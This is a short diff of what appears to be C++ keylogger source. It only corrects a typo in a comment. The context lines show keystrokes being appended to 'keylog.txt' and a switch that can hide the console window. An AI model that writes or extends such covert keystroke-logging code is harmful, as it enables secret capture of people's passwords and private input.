@@ -129,7 +129,7 @@ int main() {
 
     //std::cout << "Hello, World!" << std::endl;
     ofstream outfile ("keylog.txt", ios::app);
-    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);//1 to show conaole, 0 to hide
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);//1 to show console, 0 to hide
     file.open("keylog.txt", ios::app);
     file.imbue(locale(locale(), new codecvt_utf8<wchar_t>)); // to write utf-8 in txt file
     if(!file.is_open()){
